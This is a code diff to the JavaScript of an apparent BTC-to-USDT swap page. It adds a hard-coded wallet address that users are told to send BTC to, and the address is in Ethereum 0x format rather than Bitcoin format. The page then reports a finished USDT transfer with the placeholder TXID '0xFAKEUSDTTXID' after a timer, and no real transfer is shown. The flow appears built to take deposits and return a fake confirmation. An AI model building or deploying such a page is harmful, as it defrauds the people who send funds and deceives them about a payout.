@@ -1,4 +1,5 @@
 let btcAmount = 0;
+const btcWalletAddress = "0x49b06e4a8E75188955d6961520F0a9E2EC1B6634";
 
 document.addEventListener("DOMContentLoaded", () => {
   fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd")
@@ -19,6 +20,8 @@ function nextStep1() {
     alert("Enter a valid BTC amount.");
     return;
   }
+
+  document.getElementById("btc-address").innerText = btcWalletAddress;
   document.getElementById("step-1").classList.add("hidden");
   document.getElementById("step-2").classList.remove("hidden");
 }
@@ -51,7 +54,7 @@ function finalStep() {
         `You sent <strong>${btcAmount} BTC</strong><br>` +
         `Current BTC price: <strong>$${btcPrice}</strong><br>` +
         `USDT to be sent: <strong>${usdtAmount.toFixed(2)} USDT</strong><br><br>` +
-        `🔄 Sending USDT from <code>0x49b06e4a8E75188955d6961520F0a9E2EC1B6634</code> to <code>${usdtAddress}</code> on Binance Smart Chain...`;
+        `🔄 Sending USDT from <code>${btcWalletAddress}</code> to <code>${usdtAddress}</code> on Binance Smart Chain...`;
 
       setTimeout(() => {
         document.getElementById("result").innerHTML += `<br><br>✅ Transfer complete. TXID: <code>0xFAKEUSDTTXID</code>`;
